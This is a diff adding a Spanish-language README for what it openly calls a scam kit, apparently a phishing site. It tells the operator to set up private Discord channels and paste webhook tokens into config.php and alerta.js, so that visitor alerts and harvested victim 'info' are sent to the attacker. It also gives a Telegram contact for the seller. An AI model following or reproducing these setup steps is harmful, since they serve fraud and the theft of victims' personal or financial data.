@@ -1,0 +1,24 @@
+-----------------------------------------------------------------------------------------------------------------------
+
+*INSTRUCCIONES DE USO:
+
+1. CREAR UN SERVIDOR EN DISCORD DE USO DEDICADO UNICAMENTE PARA EL PRESENTE SCAM.
+
+2. Crear en el servidor dos canales PRIVADOS (esto es muy importante para que se mantenga segura tu info), uno 
+llamado "ALERTAS" (donde recibiras la alerta de visita al sitio) y otro llamado "INFO" (donde recibiras la info).
+
+3. En la seccion de "Configuración" de cada canal, ir a "integraciones", crear un bot y copiar el token (webhook)
+para anexarlo a los archivos.
+
+4. LOS TOKEN PARA RECIBIR DATOS EN DISCORD SE CONFIGURAN EN EL DIRECTORIO "CONFIG", SON 2 (config.php y alerta.js): 
+            -config.php: se configura el token correspondiente al canal de Discord donde se recibira la info.
+            -alerta.js: se configura el token correspondiente al canal de Discord donde se recibira las alertas 
+            de visita.
+
+        En cada archivo de configuración esta marcada la sección donde se anexara el token webhook de discord.
+
+5. ¡NO TOCAR NADA MÁS QUE LOS ARCHIVOS DE CONFIGURACIÓN PARA GARANTIZAR QUE FUNCIONE AL 100% SIEMPRE!
+
+
+                        ♛ Telegram: https://t.me/morph3ush4ck ♛
+-------------------------------------------------------------------------------------------------------------------------
